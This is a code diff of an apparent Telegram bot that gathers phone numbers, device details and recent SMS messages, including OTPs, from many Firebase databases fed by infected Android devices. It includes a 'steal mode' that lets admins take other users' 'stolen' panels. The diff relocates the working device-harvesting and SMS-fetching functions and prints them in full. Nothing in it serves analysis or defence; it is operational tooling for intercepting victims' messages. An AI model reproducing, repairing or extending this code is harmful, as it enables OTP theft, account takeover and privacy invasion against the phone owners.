@@ -55,7 +55,7 @@ BOT_USERNAME    = "offermeeshobot"
 
 # 🔴 Admin IDs
 ADMIN_IDS: set[int] = {
-    6860106371, 8306147833, 8955700, 1948746
+    6860106371, 8306147833,  
 }
 
 # 🔴 Force Join Channels
@@ -542,11 +542,19 @@ def master_log_sms(number: str, message: str, otp: str):
             f.write(log_line)
     except: pass
 
-# ═══════════════════════════════════════════════════════
-#  WORKER 3: ADMIN AUTO-BACKUP DEPARTMENT
-# ═══════════════════════════════════════════════════════
+async def auto_save_loop():
+    while True:
+        try:
+            await asyncio.sleep(60)
+            await save_data_async()
+            if len(seen_ids) > 80000:
+                seen_ids.clear()
+                gc.collect()
+        except Exception:
+            await asyncio.sleep(5)
 
 async def hourly_admin_backup(app: Application):
+    """Hourly task to send admin dashboard stats and backup JSON file."""
     while True:
         await asyncio.sleep(3600)
         try:
@@ -659,172 +667,7 @@ async def fb_keys(path: str, base: str) -> list[str]:
     except Exception: return []
 
 # ═══════════════════════════════════════════════════════
-#  ON-DEMAND CACHE INJECTOR (SOLVES "NO DEVICES FOUND")
-# ═══════════════════════════════════════════════════════
-
-async def fetch_db_data(tag: str, url: str) -> list[Device]:
-    async with WORKER_SEMAPHORE:
-        devices_list = []
-        added_set = set()
-        try:
-            root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
-                fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
-                fb_get("user_data", url), fb_get("clients", url)
-            )
-            if sim_all and isinstance(sim_all, dict):
-                info_all = device_info_all or {}
-                for dev_id, sim in sim_all.items():
-                    if dev_id in added_set: continue
-                    added_set.add(dev_id)
-                    info = info_all.get(dev_id) or {}
-                    nums = extract_all_nums(sim, info)
-                    model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
-                    devices_list.append(Device(
-                        id=dev_id, name=model, status=parse_status_str(info.get("Status")),
-                        battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0),
-                        numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}",
-                        sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
-                    ))
-            if user_data_all and isinstance(user_data_all, dict):
-                for dev_id, data in user_data_all.items():
-                    if dev_id in added_set: continue
-                    if not isinstance(data, dict): continue
-                    added_set.add(dev_id)
-                    nums = extract_all_nums(data)
-                    devices_list.append(Device(
-                        id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}",
-                        status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")),
-                        timestamp=int(data.get("timestamp") or 0), numbers=nums,
-                        device_info=data.get("Device_info") or f"Device ID: {dev_id}",
-                        sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
-                    ))
-            if clients_all and isinstance(clients_all, dict):
-                for dev_id, client in clients_all.items():
-                    if dev_id in added_set: continue
-                    if not isinstance(client, dict): continue
-                    
-                    sim_list = client.get("sims", [])
-                    s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
-                    s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
-                    
-                    nums = extract_all_nums(client, s1, s2)
-                    
-                    if not nums and not client.get("modelName"): continue
-                    added_set.add(dev_id)
-                    model = client.get("modelName") or f"Device-{dev_id[:6]}"
-                    devices_list.append(Device(
-                        id=dev_id, name=model, status=parse_status_bool(client.get("status")),
-                        battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums,
-                        device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}",
-                        sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
-                    ))
-        except Exception: pass
-        return devices_list
-
-async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None, auto_fallback: bool = True) -> list[Device]:
-    if users_db is None: users_db = {}
-    uinfo = users_db.get(chat_id, {})
-    is_vip = uinfo.get("vip_until", 0) > time.time()
-    is_admin = chat_id in ADMIN_IDS
-    steal_mode = uinfo.get("user_panels_mode", False) and is_admin
-    custom_dbs = get_user_dbs(uinfo)
-    
-    target_dbs = [] 
-    
-    if steal_mode:
-        for uid, u_data in all_users.items():
-            if uid not in ADMIN_IDS:
-                for i, url in enumerate(get_user_dbs(u_data)):
-                    target_dbs.append((f"U_{uid}_{i}", url))
-    else:
-        if is_admin or is_vip:
-            for tag, url in DATABASES.items():
-                target_dbs.append((tag, url))
-            for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
-                target_dbs.append((f"G_{i}", g_url))
-        for i, url in enumerate(custom_dbs):
-            target_dbs.append((f"U_{chat_id}_{i}", url))
-
-    devices = []
-    missing_tasks = []
-    missing_tags = []
-
-    for tag, url in target_dbs:
-        if tag in GLOBAL_DEVICE_CACHE:
-            devices.extend(GLOBAL_DEVICE_CACHE[tag])
-        else:
-            missing_tasks.append(fetch_db_data(tag, url))
-            missing_tags.append(tag)
-
-    if missing_tasks:
-        results = await asyncio.gather(*missing_tasks, return_exceptions=True)
-        for tag, res in zip(missing_tags, results):
-            if isinstance(res, list):
-                GLOBAL_DEVICE_CACHE[tag] = res
-                devices.extend(res)
-
-    unique_devices = []
-    seen_ids_set = set()
-    seen_numbers = set()
-
-    for d in devices:
-        if d.id in seen_ids_set:
-            continue
-        seen_ids_set.add(d.id)
-        if d.numbers:
-            new_nums = [num for num in d.numbers if num not in seen_numbers]
-            if not new_nums:
-                continue 
-            d.numbers = new_nums
-            seen_numbers.update(new_nums)
-        unique_devices.append(d)
-
-    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
-    
-    if steal_mode and not unique_devices and auto_fallback:
-        all_users[chat_id]["user_panels_mode"] = False
-        save_user(chat_id)
-        if _main_app:
-            asyncio.create_task(_main_app.bot.send_message(chat_id, "⚠️ **GHOST MODE AUTO-OFF:** Stolen User panels are currently empty or offline. Reverted back to 300+ global panels.", parse_mode="Markdown"))
-        return await get_all_devices(bot_token, chat_id, users_db, auto_fallback=False)
-        
-    return unique_devices
-
-async def get_device_sms(device: Device, limit: int = 10, max_age_sec: int = 3600) -> list[dict]:
-    try:
-        session = await get_http_session()
-        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=30"
-        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
-            if r.status != 200: return []
-            data = await r.json(content_type=None)
-            if not data or not isinstance(data, dict): return []
-            
-            entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
-            
-            for s in entries:
-                ts_val = s.get("timestamp") or 0
-                try:
-                    s["_parsed_ts"] = float(ts_val)
-                    if s["_parsed_ts"] > 1e11: s["_parsed_ts"] /= 1000
-                except:
-                    s["_parsed_ts"] = 0.0
-                    
-            entries.sort(key=lambda s: s["_parsed_ts"], reverse=True)
-            
-            if max_age_sec:
-                filtered = []
-                now = time.time()
-                for sms in entries:
-                    if (now - sms["_parsed_ts"]) <= max_age_sec:
-                        filtered.append(sms)
-                entries = filtered
-                
-            return entries[:limit]
-    except:
-        return []
-
-# ═══════════════════════════════════════════════════════
-#  WORKER 4: GHOST PRE-FETCH ENGINE
+#  API CHECKER FUNCTIONS 
 # ═══════════════════════════════════════════════════════
 
 async def check_number_api(service: str, number: str, retries=3) -> dict:
@@ -906,10 +749,7 @@ async def continuous_prefetch_worker(service: str):
                 await asyncio.sleep(5)
                 continue
                 
-            all_devices = []
-            for d_list in GLOBAL_DEVICE_CACHE.values():
-                all_devices.extend(d_list)
-
+            all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
             if not all_devices:
                 await asyncio.sleep(5)
                 continue
@@ -1180,6 +1020,171 @@ async def safe_edit(query, text, reply_markup=None, parse_mode=None, disable_web
         if "not modified" not in str(e).lower(): tlog(f"Edit Message Error: {e}")
     except Exception as e:
         tlog(f"Safe Edit Unexpected Error: {e}")
+
+# ═══════════════════════════════════════════════════════
+#  ON-DEMAND CACHE INJECTOR (SOLVES "NO DEVICES FOUND")
+# ═══════════════════════════════════════════════════════
+
+async def fetch_db_data(tag: str, url: str) -> list[Device]:
+    async with WORKER_SEMAPHORE:
+        devices_list = []
+        added_set = set()
+        try:
+            root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
+                fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
+                fb_get("user_data", url), fb_get("clients", url)
+            )
+            if sim_all and isinstance(sim_all, dict):
+                info_all = device_info_all or {}
+                for dev_id, sim in sim_all.items():
+                    if dev_id in added_set: continue
+                    added_set.add(dev_id)
+                    info = info_all.get(dev_id) or {}
+                    nums = extract_all_nums(sim, info)
+                    model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
+                    devices_list.append(Device(
+                        id=dev_id, name=model, status=parse_status_str(info.get("Status")),
+                        battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0),
+                        numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}",
+                        sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
+                    ))
+            if user_data_all and isinstance(user_data_all, dict):
+                for dev_id, data in user_data_all.items():
+                    if dev_id in added_set: continue
+                    if not isinstance(data, dict): continue
+                    added_set.add(dev_id)
+                    nums = extract_all_nums(data)
+                    devices_list.append(Device(
+                        id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}",
+                        status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")),
+                        timestamp=int(data.get("timestamp") or 0), numbers=nums,
+                        device_info=data.get("Device_info") or f"Device ID: {dev_id}",
+                        sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
+                    ))
+            if clients_all and isinstance(clients_all, dict):
+                for dev_id, client in clients_all.items():
+                    if dev_id in added_set: continue
+                    if not isinstance(client, dict): continue
+                    
+                    sim_list = client.get("sims", [])
+                    s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
+                    s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
+                    
+                    nums = extract_all_nums(client, s1, s2)
+                    
+                    if not nums and not client.get("modelName"): continue
+                    added_set.add(dev_id)
+                    model = client.get("modelName") or f"Device-{dev_id[:6]}"
+                    devices_list.append(Device(
+                        id=dev_id, name=model, status=parse_status_bool(client.get("status")),
+                        battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums,
+                        device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}",
+                        sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
+                    ))
+        except Exception: pass
+        return devices_list
+
+async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None, auto_fallback: bool = True) -> list[Device]:
+    if users_db is None: users_db = {}
+    uinfo = users_db.get(chat_id, {})
+    is_vip = uinfo.get("vip_until", 0) > time.time()
+    is_admin = chat_id in ADMIN_IDS
+    steal_mode = uinfo.get("user_panels_mode", False) and is_admin
+    custom_dbs = get_user_dbs(uinfo)
+    
+    target_dbs = [] 
+    
+    if steal_mode:
+        for uid, u_data in all_users.items():
+            if uid not in ADMIN_IDS:
+                for i, url in enumerate(get_user_dbs(u_data)):
+                    target_dbs.append((f"U_{uid}_{i}", url))
+    else:
+        if is_admin or is_vip:
+            for tag, url in DATABASES.items():
+                target_dbs.append((tag, url))
+            for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
+                target_dbs.append((f"G_{i}", g_url))
+        for i, url in enumerate(custom_dbs):
+            target_dbs.append((f"U_{chat_id}_{i}", url))
+
+    devices = []
+    missing_tasks = []
+    missing_tags = []
+
+    for tag, url in target_dbs:
+        if tag in GLOBAL_DEVICE_CACHE:
+            devices.extend(GLOBAL_DEVICE_CACHE[tag])
+        else:
+            missing_tasks.append(fetch_db_data(tag, url))
+            missing_tags.append(tag)
+
+    if missing_tasks:
+        results = await asyncio.gather(*missing_tasks, return_exceptions=True)
+        for tag, res in zip(missing_tags, results):
+            if isinstance(res, list):
+                GLOBAL_DEVICE_CACHE[tag] = res
+                devices.extend(res)
+
+    unique_devices = []
+    seen_ids_set = set()
+    seen_numbers = set()
+
+    for d in devices:
+        if d.id in seen_ids_set:
+            continue
+        seen_ids_set.add(d.id)
+        if d.numbers:
+            new_nums = [num for num in d.numbers if num not in seen_numbers]
+            if not new_nums:
+                continue 
+            d.numbers = new_nums
+            seen_numbers.update(new_nums)
+        unique_devices.append(d)
+
+    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
+    
+    if steal_mode and not unique_devices and auto_fallback:
+        all_users[chat_id]["user_panels_mode"] = False
+        save_user(chat_id)
+        if _main_app:
+            asyncio.create_task(_main_app.bot.send_message(chat_id, "⚠️ **GHOST MODE AUTO-OFF:** Stolen User panels are currently empty or offline. Reverted back to 300+ global panels.", parse_mode="Markdown"))
+        return await get_all_devices(bot_token, chat_id, users_db, auto_fallback=False)
+        
+    return unique_devices
+
+async def get_device_sms(device: Device, limit: int = 10, max_age_sec: int = 3600) -> list[dict]:
+    try:
+        session = await get_http_session()
+        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=30"
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
+            if r.status != 200: return []
+            data = await r.json(content_type=None)
+            if not data or not isinstance(data, dict): return []
+            
+            entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
+            
+            for s in entries:
+                ts_val = s.get("timestamp") or 0
+                try:
+                    s["_parsed_ts"] = float(ts_val)
+                    if s["_parsed_ts"] > 1e11: s["_parsed_ts"] /= 1000
+                except:
+                    s["_parsed_ts"] = 0.0
+                    
+            entries.sort(key=lambda s: s["_parsed_ts"], reverse=True)
+            
+            if max_age_sec:
+                filtered = []
+                now = time.time()
+                for sms in entries:
+                    if (now - sms["_parsed_ts"]) <= max_age_sec:
+                        filtered.append(sms)
+                entries = filtered
+                
+            return entries[:limit]
+    except:
+        return []
 
 # ═══════════════════════════════════════════════════════
 #  TELEGRAM COMMAND HANDLERS
@@ -1509,7 +1514,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             devices = await get_all_devices(bot_token, chat_id, users_db)
             if not devices:
                 if chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("vip_until", 0) > time.time():
-                    await safe_edit(query, "⏳ **System Syncing...**\n\nBot abhi 300+ panels se live devices fetch kar raha hai. Kripya 15-20 seconds wait karein aur phir se click karein.", parse_mode="Markdown")
+                    await safe_edit(query, "⏳ **System Syncing...**\n\nBot abhi live devices fetch kar raha hai. Kripya 5 seconds wait karein aur phir se click karein.", parse_mode="Markdown")
                 else:
                     await safe_edit(query, "❌ No devices found. Please Add Custom Panels or Refer to get VIP Global access.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                 return
@@ -1626,7 +1631,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         except: pass
 
 # ═══════════════════════════════════════════════════════
-#  TEXT MESSAGE HANDLER
+#  TEXT MESSAGE HANDLER (ANTI-SPAM & CHOKE FIX)
 # ═══════════════════════════════════════════════════════
 
 async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1725,7 +1730,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         devices = await get_all_devices(bot_token, chat_id, users_db)
         if not devices:
             if chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("vip_until", 0) > time.time():
-                await update.message.reply_text("⏳ **System Syncing...**\n\nBot abhi 300+ panels se live devices fetch kar raha hai. Kripya 15-20 seconds wait karein aur phir se click karein.", parse_mode="Markdown")
+                await update.message.reply_text("⏳ **System Syncing...**\n\nBot abhi live devices fetch kar raha hai. Kripya 5 seconds wait karein aur phir se click karein.", parse_mode="Markdown")
             else:
                 await update.message.reply_text("❌ Aapke paas abhi koi active devices nahi hain. 'Add Custom Panel' se panel add karein ya VIP lein.")
             return
@@ -2019,7 +2024,6 @@ async def _update_global_cache():
         for i, db_url in enumerate(get_user_dbs(uinfo)):
             dbs_to_poll[f"U_{uid}_{i}"] = db_url
 
-    # 🟢 CHUNKING FIX: Processes DBs 30 at a time to prevent RAM overload
     all_devices_gathered = []
     items = list(dbs_to_poll.items())
     
@@ -2070,7 +2074,6 @@ async def poll_loop(app: Application) -> None:
                     dbs_to_poll[f"U_{uid}_{i}"] = db_url
             
             if first_run:
-                # 🟢 CHUNKING FIX For initial Load
                 items = list(dbs_to_poll.items())
                 for i in range(0, len(items), 30):
                     chunk = items[i:i+30]
@@ -2092,7 +2095,6 @@ async def poll_loop(app: Application) -> None:
                 first_run = False
                 tlog("Private Bot Engine ready! Monitoring DBs...")
             else:
-                # 🟢 CHUNKING FIX For Polling Loop
                 items = list(dbs_to_poll.items())
                 for i in range(0, len(items), 30):
                     chunk = items[i:i+30]
@@ -2123,7 +2125,7 @@ def main() -> None:
     app = (
         Application.builder()
         .token(TOKEN)
-        .connection_pool_size(100) # 🟢 Dropped from 4096 to 100 for Railway Limit
+        .connection_pool_size(100) 
         .pool_timeout(60.0)
         .connect_timeout(30.0)
         .read_timeout(30.0)
